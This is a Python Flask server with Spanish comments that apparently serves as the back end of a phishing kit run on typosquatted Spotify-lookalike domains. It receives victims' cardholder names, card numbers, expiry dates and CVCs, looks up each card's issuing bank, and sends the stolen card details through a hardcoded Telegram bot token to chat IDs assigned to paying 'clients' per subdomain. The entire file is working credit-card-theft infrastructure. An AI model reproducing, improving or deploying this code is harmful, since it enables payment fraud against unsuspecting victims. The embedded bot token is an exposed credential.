import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
# Permitimos todos los orígenes para que los subdominios no tengan problemas de seguridad
CORS(app, resources={r"/*": {"origins": "*"}})

# --- CONFIGURACIÓN ---
# Tu Token de Telegram
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'

# --- MAPA DE CLIENTES (EL CORAZÓN DEL NEGOCIO) ---
# ESTRUCTURA: 'dominio_o_subdominio': ['ID1', 'ID2', 'ID3']
# IMPORTANTE: Los IDs deben ir entre comillas y dentro de corchetes [ ]
CLIENTES_MAPA = {
    'spotlfypremium.online': ['6953415010', '7707049896'], 
    'cliente1.spotlfypremium.online': ['7707049896'],
    'free.spotlfypremium.online': ['-1087968824', '1087968824'], # Tu nuevo cliente configurado
    'promo.spotlfypremium.online': ['123456789'],
    'juan.spotlfypremium.online': ['987654321'],
}

def get_bank_info_pro(card_number):
    """Consulta de banco con protección contra bloqueos."""
    bin_number = card_number[:6]
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    try:
        print(f"🔍 Buscando banco para BIN: {bin_number}")
        res = requests.get(f"https://lookup.binlist.net/{bin_number}", headers=headers, timeout=4)
        if res.status_code == 200:
            data = res.json()
            bank = data.get('bank', {}).get('name', 'Desconocido')
            type_card = data.get('type', 'DESCONOCIDO').upper()
            country = data.get('country', {}).get('name', 'Desconocido')
            return f"{bank} | {type_card} | {country}"
        return "🏦 Banco: Desconocido"
    except:
        return "🏦 Error de conexión"

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    # 1. DETECCIÓN AUTOMÁTICA DE DOMINIO (Crucial para saber a quién pertenece la CC)
    host_recibido = request.headers.get('Host', '').split(':')[0]
    
    # Limpieza por si el navegador envía el puerto
    host_recibido = host_recibido.split(':')[0]

    print(f"🌐 Petición recibida desde el Host: {host_recibido}")

    # 2. BUSCAR LOS DESTINATARIOS EN EL MAPA
    lista_destinatarios = CLIENTES_MAPA.get(host_recibido)

    # Si el dominio no está en el mapa, lo ignoramos
    if not lista_destinatarios:
        print(f"🚫 DOMINIO NO AUTORIZADO: {host_recibido}")
        print(f"🔍 Dominios registrados actualmente: {list(CLIENTES_MAPA.keys())}")
        return jsonify({"status": "ignored", "error": "dominio_no_registrado"}), 200

    # 3. CAPTURA DE DATOS DEL FORMULARIO
    data = request.json
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    # 4. CONSULTA DE BANCO
    print(f"🔍 Consultando banco para la tarjeta: {tarjeta[:6]}...")
    info_banco = get_bank_info_pro(tarjeta)

    # 5. CONSTRUCCIÓN DEL MENSAJE PROFESIONAL
    mensaje = (
        f"💰 *NUEVA CC CAPTURADA* 💰\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🌐 *ORIGEN:* `{host_recibido}`\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🏦 *INFO:* `{info_banco}`\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

    # 6. REPARTO MASIVO A TODOS LOS DESTINATARIOS DEL DOMINIO
    exitos = 0
    for id_receptor in lista_destinatarios:
        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": id_receptor, "text": mensaje, "parse_mode": "Markdown"}
        try:
            res = requests.post(url_telegram, json=payload, timeout=5)
            if res.status_code == 200:
                exitos += 1
                print(f"✅ CC enviada con éxito al ID: {id_receptor}")
            else:
                print(f"❌ Error al enviar a {id_receptor}: {res.text}")
        except Exception as e:
            print(f"❌ Error de red al enviar a {id_receptor}: {e}")

    print(f"🏁 Proceso terminado. Mensajes enviados con éxito a {exitos} personas desde {host_recibido}")
    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    # Ejecución en el puerto que asigne Railway
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
